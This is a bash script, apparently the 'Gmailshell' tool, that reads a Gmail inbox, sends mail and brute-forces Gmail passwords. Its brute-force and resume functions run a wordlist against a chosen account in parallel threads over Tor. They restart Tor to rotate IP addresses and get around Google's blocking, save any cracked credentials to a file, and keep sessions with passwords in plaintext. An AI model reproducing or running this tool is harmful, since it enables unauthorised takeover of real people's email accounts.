#!/bin/bash
# Gmailshell v1.0
# Coded by: github.com/thelinuxchoice
# Instagram: @thelinuxchoice

trap 'printf "\n";store;exit 1' 2

checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
    exit 1
fi
}

dependencies() {

command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run ./install.sh. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run ./install.sh. Aborting."; exit 1; }

}

banner() {

printf "\n"
printf "\e[94m  .88888.  \e[0m                    \e[94moo\e[0m \e[32mdP\e[0m\e[92m          dP                dP dP \n"
printf "\e[94m d8'   \`88\e[0m                        \e[32m88\e[0m          \e[92m88                88 88 \n"
printf "\e[94m 88        \e[0m\e[91m88d8b.d8b. \e[0m\e[93m.d8888b.\e[0m \e[94mdP\e[0m \e[32m88\e[0m \e[92m.d8888b. 88d888b. .d8888b. 88 88 \n"
printf "\e[94m 88   YP88 \e[0m\e[91m88'\`88'\`88 \e[0m\e[93m88'  \`88\e[0m \e[94m88\e[0m \e[32m88\e[0m \e[92mY8ooooo. 88'  \`88 88ooood8 88 88 \n"
printf "\e[94m Y8.   .88 \e[0m\e[91m88  88  88 \e[0m\e[93m88.  .88\e[0m \e[94m88\e[0m \e[32m88\e[0m       \e[92m88 88    88 88.  ... 88 88 \n"
printf "\e[94m  \`88888'  \e[0m\e[91mdP  dP  dP \e[0m\e[93m\`88888P8 \e[0m\e[94mdP\e[0m \e[32mdP\e[0m\e[92m \`88888P' dP    dP \`88888P' dP dP \e[0m\n"
printf "\n"
printf "\e[1;77m Reader/Mailer/BruteForcer Gmail v1.0 Author: @thelinuxchoice (Gh/Ig) \e[0m\n"
printf "\n"
printf "\e[1;91m                           [ Warning! ]                          \e[0m\n"
printf "\e[1;93m   [!] Enable Less Secure apps: myaccount.google.com/lesssecureapps\n\e[0m"
}

reader() {

read -p $'\e[1;92mEmail: \e[0m' username
read -s -p $'\e[1;92mPassword: \e[0m' password
printf "\n\n\e[1;92mInbox for:\e[0m\e[1;77m %s\n\e[0m" $username
printf "\e[1;77m\n\n"
curl -s -u "$username:$password" "https://mail.google.com/mail/feed/atom" | tr -d '\n' | sed 's:</entry>:\n:g' | sed 's/.*<title>\(.*\)<\/title.*<author><name>\([^<]*\)<\/name><email>\([^<]*\).*/Author: \2 [\3] \nSubject: \1\n/' | sed 's:</feed>:\n:g' | head -n 15

printf "\e[0m\n"

}

mailer() {
read -p $'\e[1;92mEmail from: \e[0m' username
read -s -p $'\e[1;92mPassword: \e[0m' password
read -p $'\e[1;92m\nEmail to: \e[0m' mailto
read -p $'\e[1;92mFrom (your name): \e[0m' from
read -p $'\e[1;92mTo (rcpt name): \e[0m' rcptname
read -p $'\e[1;92mSubject: \e[0m' subject
read -p $'\e[1;92mMessage: \e[0m' message 
echo "From: $from" > sentmail.txt
echo "To: $rcptname" >> sentmail.txt
echo "Subject: $subject" >> sentmail.txt
echo " " >> sentmail.txt
echo "$message" >> sentmail.txt
curl -s --url 'smtps://smtp.gmail.com:465' --ssl-reqd --mail-from "$username" --mail-rcpt "$mailto" --upload-file sentmail.txt --user "$username:$password" --insecure 2>&1
if [[ $? == 67 ]]; then
printf "\e[1;91mLogin Denied!\n\e[0m"
else
printf "\e[1;92m\nMail sent!\e[0m\n"
rm -rf sentmail.txt
fi
}


function start() {
banner
checkroot
printf "\n"
printf "\e[1;77mChoose: \n\e[0m"
read -p $'\e[1;77m1.\e[0m\e[1;92m Inbox Reader, \e[0m\e[1;77m2. \e[0m\e[1;94mSend Mail, \e[0m \e[1;77m3.\e[0m\e[1;91m Bruteforcer\n\e[0m\e[1;92m>_ \e[0m' choose
if [[ $choose == "1" ]]; then
reader
elif [[ $choose == "2" ]]; then
mailer
elif [[ $choose == "3" ]]; then
printf "\e[1;91mPlease, keep in mind that's an experimental module, since google blocks bruteforcing.\n\e[0m"
read -p $'\e[1;92mI got it! (Hit Enter) \e[0m' null
read -p $'\e[1;92mUsername or email: \e[0m' username

default_wl_pass="passwords.lst"
read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="10"
#read -p $'\e[1;92mThreads (Use < 5, Default 5): \e[0m' threads
threads="${threads:-${default_threads}}"
#fi
bruteforcer
else
printf "\e[1;91m [!] Invalid option, try again!\n"
sleep 1
start
fi
}

checktor() {

check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[1;91mPlease, check your TOR Connection! Just type tor or service tor start\n\e[0m"
exit 1
fi

}

function store() {

if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
if [[ "$threads" -gt 10 ]]; then
sleep 6
else
sleep 3
fi
rm -rf cookies*
default_session="Y"
printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $username
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
printf "username=\"%s\"\npassword=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $username $password $wl_pass $token > sessions/store.session.$username.$(date +"%FT%H%M")
printf "\e[1;77mSession saved.\e[0m\n"
printf "\e[1;92mUse ./instashell --resume\n"
else
exit 1
fi
else
exit 1
fi
}


function changeip() {

killall -HUP tor


}

function bruteforcer() {

dependencies
checktor
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" $username
printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
changeip
while [ $token -lt $count_pass ]; do
IFS=$'\n'
for password in $(sed -n ''$startline','$endline'p' $wl_pass); do
countpass=$(grep -n "$password" "$wl_pass" | cut -d ":" -f1)

let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password

{(trap '' SIGINT && var=$(curl --socks5-hostname localhost:9050 -s -u "$username:$password" "https://mail.google.com/mail/feed/atom"); if [[ "$var" == *"Gmail - Inbox for"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.gmailshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.gmailshell \n\e[0m"; kill -1 $$; fi;  ) } & done; wait $!;

#smtp method
#{(trap '' SIGINT && var=$(curl --socks5-hostname localhost:9050 --url 'smtps://smtp.gmail.com:465' --ssl-reqd --user "$username:$password" --insecure | grep -c "gsmtp"); if [[ "$var" == 1 ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.gmailshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.gmailshell \n\e[0m"; kill -1 $$; fi;  ) } & done; wait $!;


let startline+=$threads
let endline+=$threads
changeip
hourdate=$(date +%H)
dat=$(($hourdate + 1))
mindate=$(date +%M:%S)
printf "\e[1;91m[*] Waiting 1 hour, to return at:\e[0m\e[1;93m %s:%s\n\e[0m" $dat $mindate
sleep 3600

done
exit 1
}

function resume() {

banner 
checktor
counter=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] No sessions\n\e[0m"
exit 1
fi
printf "\e[1;92mFiles sessions:\n\e[0m"
for list in $(ls sessions/store.session*); do
IFS=$'\n'
source $list
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$password"
let counter++
done
read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
source $(ls sessions/store.session* | sed ''$fileresume'q;d')
default_threads=10
read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $username
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"


count_pass=$(wc -l $wl_pass | cut -d " " -f1)
changeip
while [ $token -lt $count_pass ]; do
IFS=$'\n'
for password in $(sed -n '/\b'$password'\b/,'$(($token+threads))'p' $wl_pass); do
COOKIES='cookies'$countpass''
countpass=$(grep -n -w "$password" "$wl_pass" | cut -d ":" -f1)
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password
let token++
{(trap '' SIGINT && var=$(curl --socks5-hostname localhost:9050 -s -u "$username:$password" "https://mail.google.com/mail/feed/atom"); if [[ "$var" == *"Gmail - Inbox for"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.gmailshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.gmailshell \n\e[0m"; kill -1 $$; fi;  ) } & done; wait $!;
changeip
hourdate=$(date +%H)
dat=$(($hourdate + 1))
mindate=$(date +%M:%S)
printf "\e[1;91m[*] Waiting 1 hour, to return at:\e[0m\e[1;93m %s:%s\n\e[0m" $dat $mindate
sleep 3600

done
exit 1
}

case "$1" in --resume) resume ;; *)
start
esac

